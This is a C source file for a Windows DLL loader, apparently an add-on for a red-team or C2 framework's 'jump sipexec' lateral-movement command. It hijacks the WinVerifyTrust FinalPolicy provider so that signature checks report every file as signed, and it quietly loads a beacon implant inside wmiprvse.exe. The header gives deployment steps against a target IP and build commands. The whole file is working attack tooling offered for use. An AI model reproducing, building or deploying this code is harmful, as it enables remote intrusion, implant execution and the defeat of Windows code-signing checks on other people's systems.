/*
 * sipexec_loader.c -- Process-aware FinalPolicy loader for jump sipexec
 *
 * Problem: FinalPolicy hijack is system-wide. Every process calling WVT
 * during the hijack window loads $DLL. A full beacon agent crashes DWM
 * and other sensitive processes.
 *
 * Solution: This thin loader checks the host process. Only starts the
 * beacon inside wmiprvse.exe. Returns S_OK in all processes (keeps
 * signature checks happy, no crashes).
 *
 * Usage:
 *   1. Place beacon DLL on target as C:\Windows\tmb_beacon.dll (or any path)
 *   2. Use this loader as the sipexec DLL:
 *      jump sipexec 10.0.0.5 /path/to/sipexec_loader.dll
 *   3. The loader finds the beacon DLL next to itself (same dir, name: beacon.dll)
 *      or at the path set in BEACON_PATH define.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -shared -O2 -s -fno-ident \
 *     -o sipexec_loader.dll sipexec_loader.c -lkernel32
 *
 *   Custom beacon filename:
 *   x86_64-w64-mingw32-gcc -shared -O2 -s -fno-ident \
 *     -DBEACON_NAME='"agent.x64.dll"' \
 *     -o sipexec_loader.dll sipexec_loader.c -lkernel32
 */
#include <windows.h>

#ifndef BEACON_NAME
#define BEACON_NAME "beacon.dll"
#endif

static volatile LONG g_ran = 0;

/* ponytail: case-insensitive substring match without CRT */
static int contains_ci(const char *hay, const char *needle) {
    for (int i = 0; hay[i]; i++) {
        int j = 0;
        while (needle[j]) {
            char a = hay[i+j], b = needle[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
            j++;
        }
        if (!needle[j]) return 1;
    }
    return 0;
}

static void load_beacon(HMODULE hSelf) {
    /* Only run once across all WVT calls */
    if (InterlockedCompareExchange(&g_ran, 1, 0) != 0) return;

    /* Check if we're inside wmiprvse.exe */
    char proc[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, proc, MAX_PATH);
    if (!contains_ci(proc, "wmiprvse")) return;

    /* Build beacon path: same directory as this DLL + BEACON_NAME */
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(hSelf, self, MAX_PATH);

    /* Find last backslash */
    char *last = self;
    for (char *p = self; *p; p++)
        if (*p == '\\') last = p;

    /* Replace filename with beacon name */
    if (last != self) last++;
    char *bn = BEACON_NAME;
    while (*bn) *last++ = *bn++;
    *last = '\0';

    /* Load beacon DLL -- DllMain fires, agent starts */
    LoadLibraryA(self);
}

/* FinalPolicy export: returns S_OK for all processes (everything appears signed).
 * Only loads beacon in wmiprvse.exe. */
__declspec(dllexport)
long __stdcall SoftpubAuthenticode(void *prov) {
    return 0; /* S_OK */
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        load_beacon(h);
    }
    return TRUE;
}
